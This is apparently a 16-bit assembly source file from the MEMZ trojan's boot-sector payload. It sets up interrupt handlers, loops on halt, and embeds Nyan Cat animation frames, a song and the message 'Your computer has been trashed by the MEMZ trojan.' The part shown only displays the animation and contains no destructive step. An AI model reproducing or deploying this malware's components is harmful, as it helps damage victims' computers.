; This is where the program starts after decompression

use16
org 0x8E00

%include "Utils/macros.asm"
%include "Setup/setup.asm"

; Everything should be already set up, so the only
; thing we need to do here is to wait for interrupts
haltLoop:
	hlt
	jmp haltLoop

; Include the interrupt handlers after the loop to
; prevent them from triggering by including the code
%include "Interrupts/timerHandler.asm"
%include "Interrupts/keyboardHandler.asm"

%include "Utils/timer.asm"

; ==============================
;            Variables
; ==============================

frameTickCounter db 0
noteTickCounter  db 0
nyanTickCounter  db 0

frameIndex dw 0

soundIndex dw song
soundWait  db 0

nyanTimeStart: db "You Nyaned for "
nyanTime: db "000000.0"
nyanTimeLen equ $-nyanTime
nyanTimeEnd: db " seconds!"
nyanTimeLenFull equ $-nyanTimeStart

nyanTimeBin dw 0

; ==============================
;              Data
; ==============================

frames:        incbin "../../Build/frames.bin"
framesLength:  equ $-frames

special:       incbin "../../Build/special.bin"
specialLength: equ $-special

song:        incbin "../../Build/song.bin"
songLength:  equ $-song

message:       db "Your computer has been trashed by the MEMZ trojan. Now enjoy the Nyan Cat..."
messageLength: equ $-message